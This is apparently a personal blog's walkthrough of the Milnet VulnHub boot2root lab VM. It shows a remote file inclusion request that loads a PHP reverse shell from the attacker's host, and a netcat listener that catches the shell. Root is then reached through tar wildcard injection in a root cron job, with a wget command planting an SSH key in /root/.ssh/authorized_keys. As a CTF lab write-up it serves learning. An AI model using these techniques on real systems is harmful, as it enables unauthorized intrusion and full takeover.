---
layout: post
title: "Milnet hacking challenge"
date: 2016-06-02 12:21:50 -0400
comments: true
categories: boot2root
---

It's been a while since I've done one of these. Milnet is the latest VM uploaded to [VulnHub](https://vulnhub.com), and is a beginner level challenge. Not having anything to do at midnight, I decided to give it a shot, if not to kill some time before crashing. You can grab Milnet [here](https://www.vulnhub.com/entry/milnet-1,148/). 

Milnet is kind enough to tell us what IP address it's running on once it boots up. Thank you. In my case, it was 172.16.146.131. As usual, enumeration is key, so I started with a port scan:

```
# echo 172.16.146.131 > ip
# onetwopunch.sh -t ip -i eth1 -n '-sV -A'
                             _                                          _       _
  ___  _ __   ___           | |___      _____    _ __  _   _ _ __   ___| |__   / \
 / _ \| '_ \ / _ \          | __\ \ /\ / / _ \  | '_ \| | | | '_ \ / __| '_ \ /  /
| (_) | | | |  __/ ᕦ(ò_óˇ)ᕤ | |_ \ V  V / (_) | | |_) | |_| | | | | (__| | | /\_/
 \___/|_| |_|\___|           \__| \_/\_/ \___/  | .__/ \__,_|_| |_|\___|_| |_\/
                                                |_|
                                                                   by superkojiman

[+] Protocol : tcp
[+] Interface: eth1
[+] Nmap opts: -sV -A
[+] Targets  : ip
[+] Scanning 172.16.146.131 for tcp ports...
[+] Obtaining all open TCP ports using unicornscan...
[+] unicornscan -i eth1 -mT 172.16.146.131:a -l /usr/local/bin/udir/172.16.146.131-tcp.txt
[*] TCP ports for nmap to scan: 22,80,
[+] nmap -e eth1 -sV -A -oX /usr/local/bin/ndir/172.16.146.131-tcp.xml -oG /usr/local/bin/ndir/172.16.146.131-tcp.grep -p 22,80, 172.16.146.131

Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-02 12:31 EDT
Nmap scan report for 172.16.146.131
Host is up (0.00045s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 9b:b5:21:38:96:7f:85:bd:1b:aa:9a:70:cf:db:cd:36 (RSA)
|_  256 93:30:be:c2:af:dd:81:a8:25:2b:57:e5:01:49:91:57 (ECDSA)
80/tcp open  http    lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 00:0C:29:FD:1A:F8 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.45 ms 172.16.146.131

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.95 seconds
[+] Scans completed
```

Port 80 looked promising, so I fired up Burp Suite and pointed Iceweasel to http://172.16.146.131. 

![](/images/2016-06-02/milnetweb.png)

After exploring around for a bit, I examined the captured results from Burp Suite and noticed that a POST request was sent when clicking on the buttons on the left:

```
POST /content.php HTTP/1.1
Host: 172.16.146.131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.16.146.131/nav.php
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

route=bomb
```

It occured to me that the value assigned to route might be a PHP page without the extension. I intercepted the request in Burp Suite, changed it to index, and proved my assumption was correct.

![](/images/2016-06-02/milnetindex.png)

Attempting to include local files like /etc/password didn't work. So I decided to try a remote file include instead. A simple PHP page hosted on my attacking machine that printed out "Hello" sufficed:

```
POST /content.php HTTP/1.1
Host: 172.16.146.131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.16.146.131/nav.php
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

route=http://172.16.146.129/test
```

Sure enough, the contents of my PHP page were executed and displayed:


![](/images/2016-06-02/rfi.png)

Time to get a shell! I'm using a PHP reverse shell from [Pentest Monkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell), which you can also find in a default Kali install. I saved it as shell.php, setup a netcat listener on port 1234, and replayed the captured HTTP request on Burp Suite, making sure to set route to http://172.16.146.129/shell

```
POST /content.php HTTP/1.1
Host: 172.16.146.131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.16.146.131/nav.php
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

route=http://172.16.146.129/shell
```

Forward the request, and I got my shell:

```
# nc -lvp 445
listening on [any] 445 ...
172.16.146.131: inverse host lookup failed: Unknown host
connect to [172.16.146.129] from (UNKNOWN) [172.16.146.131] 44852
Linux seckenheim.net.mil 4.4.0-22-generic #40-Ubuntu SMP Thu May 12 22:03:46 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 19:25:27 up  1:05,  0 users,  load average: 0.07, 0.04, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

Ok, next step, escalate privileges. There's only one user on the server:

```
$ ls -l /home/
total 4
drwxr-xr-x 4 langman langman 4096 May 21 22:27 langman
$ ls /home/langman/
SDINET
$ ls /home/langman/SDINET
DCA_Circular.310-P115-1
DefenseCode_Unix_WildCards_Gone_Wild.txt
FUN18.TXT
compserv.txt
fips-index.
fips_500_166.txt
fips_500_169.txt
fips_500_170.txt
fips_500_171.txt
pentagon.txt
sec-8901.txt
sec-8902.txt
sec-9540.txt
sec-9720.txt
```

Some old school reading right there, except for DefenseCode_Unix_WildCards_Gone_Wild.txt. I remember reading this a while back, and it seemed like it might be a hint on how to progress further. 

Anyway, I did more enumeration and found something interesting in /etc/crontab:

```
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /backup/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

A script called backup.sh was being executed as root. The contents of said script:

```
$ cat /backup/backup.sh
#!/bin/bash
cd /var/www/html
tar cf /backup/backup.tgz *
```

Oh ho! Looks like that wildcards document was going to come in handy after all. According to the document, we can exploit tar's wildcard parsing by creating a file called "--checkpoint=1" and "--checkpoint-action=exec=sh win.sh". 

```
$ echo '' > '--checkpoint=1'
$ echo '' > '--checkpoint-action=exec=sh win.sh'
$ ls -l
total 128
-rw-rw-rw- 1 www-data www-data     1 Jun  2 19:57 --checkpoint-action=exec=sh win.sh
-rw-rw-rw- 1 www-data www-data     1 Jun  2 19:56 --checkpoint=1
-rw-r--r-- 1 root     root     73450 Aug  6  2015 bomb.jpg
-rw-r--r-- 1 root     root      3901 May 21 18:56 bomb.php
-rw-r--r-- 1 root     root       124 May 21 17:50 content.php
-rw-r--r-- 1 root     root       145 May 21 17:17 index.php
-rw-r--r-- 1 www-data www-data    20 May 21 15:54 info.php
-rw-r--r-- 1 root     root       109 May 21 18:53 main.php
-rw-r--r-- 1 root     root     18260 Jan 22  2012 mj.jpg
-rw-r--r-- 1 root     root       532 May 21 23:33 nav.php
-rw-r--r-- 1 root     root       253 May 22 21:07 props.php
```

Now I just needed something in win.sh. I decided to just have it download my id_rsa_pub into /root/.ssh/authorized_keys so I could ssh in as root. 

```
$ printf 'mkdir -p /root/.ssh && chmod 700 /root/.ssh && wget http://172.16.146.129/id_rsa.pub -O /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys' > win.sh
```

Now I just waited for cron to execute backup.sh, which in turn would execute win.sh. I just watched the HTTP requests until I saw my id_rsa.pub get downloaded:

```
# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
172.16.146.131 - - [02/Jun/2016 13:25:27] "GET /shell.php HTTP/1.0" 200 -
172.16.146.131 - - [02/Jun/2016 14:00:01] "GET /id_rsa.pub HTTP/1.1" 200 -
172.16.146.131 - - [02/Jun/2016 14:00:01] "GET /id_rsa.pub HTTP/1.1" 200 -
172.16.146.131 - - [02/Jun/2016 14:00:01] "GET /id_rsa.pub HTTP/1.1" 200 -
172.16.146.131 - - [02/Jun/2016 14:00:01] "GET /id_rsa.pub HTTP/1.1" 200 -
172.16.146.131 - - [02/Jun/2016 14:00:01] "GET /id_rsa.pub HTTP/1.1" 200 -
172.16.146.131 - - [02/Jun/2016 14:00:01] "GET /id_rsa.pub HTTP/1.1" 200 -
172.16.146.131 - - [02/Jun/2016 14:00:01] "GET /id_rsa.pub HTTP/1.1" 200 -
172.16.146.131 - - [02/Jun/2016 14:00:01] "GET /id_rsa.pub HTTP/1.1" 200 -
172.16.146.131 - - [02/Jun/2016 14:00:01] "GET /id_rsa.pub HTTP/1.1" 200 -
172.16.146.131 - - [02/Jun/2016 14:00:01] "GET /id_rsa.pub HTTP/1.1" 200 -
172.16.146.131 - - [02/Jun/2016 14:00:01] "GET /id_rsa.pub HTTP/1.1" 200 -
```

Moment of truth:

```
# ssh root@172.16.146.131
The authenticity of host '172.16.146.131 (172.16.146.131)' can't be established.
ECDSA key fingerprint is SHA256:q26VY0+zPFYF+vxU8EhtjGn/d5BmiUjb/qTeoGAYGlk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.16.146.131' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-22-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

19 packages can be updated.
0 updates are security updates.


Last login: Sun May 22 21:04:14 2016 from 192.168.0.79
root@seckenheim:~# id
uid=0(root) gid=0(root) groups=0(root)
root@seckenheim:~# ls
credits.txt
```

Oh yeah! Here are the contents of credits.txt:

```
root@seckenheim:~# cat credits.txt
        ,----,
      ,/   .`|
    ,`   .'  :  ,---,                          ,---,.
  ;    ;     /,--.' |                        ,'  .' |                  ,---,
.'___,/    ,' |  |  :                      ,---.'   |      ,---,     ,---.'|
|    :     |  :  :  :                      |   |   .'  ,-+-. /  |    |   | :
;    |.';  ;  :  |  |,--.   ,---.          :   :  |-, ,--.'|'   |    |   | |
`----'  |  |  |  :  '   |  /     \         :   |  ;/||   |  ,"' |  ,--.__| |
    '   :  ;  |  |   /' : /    /  |        |   :   .'|   | /  | | /   ,'   |
    |   |  '  '  :  | | |.    ' / |        |   |  |-,|   | |  | |.   '  /  |
    '   :  |  |  |  ' | :'   ;   /|        '   :  ;/||   | |  |/ '   ; |:  |
    ;   |.'   |  :  :_:,''   |  / |        |   |    \|   | |--'  |   | '/  '
    '---'     |  | ,'    |   :    |        |   :   .'|   |/      |   :    :|
              `--''       \   \  /         |   | ,'  '---'        \   \  /
                           `----'          `----'                  `----'


This was milnet for #vulnhub by @teh_warriar
I hope you enjoyed this vm!

If you liked it drop me a line on twitter or in #vulnhub.

I hope you found the clue:
/home/langman/SDINET/DefenseCode_Unix_WildCards_Gone_Wild.txt
I was sitting on the idea for using this technique for a BOOT2ROOT VM prives for a long time...

This VM was inspired by The Cuckoo's Egg.
If you have not read it give it a try:
http://www.amazon.com/Cuckoos-Egg-Tracking-Computer-Espionage/dp/1416507787/
```

Nice beginner VM, thanks to [@teh_warriar](https://twitter.com/teh_warriar) for providing it!
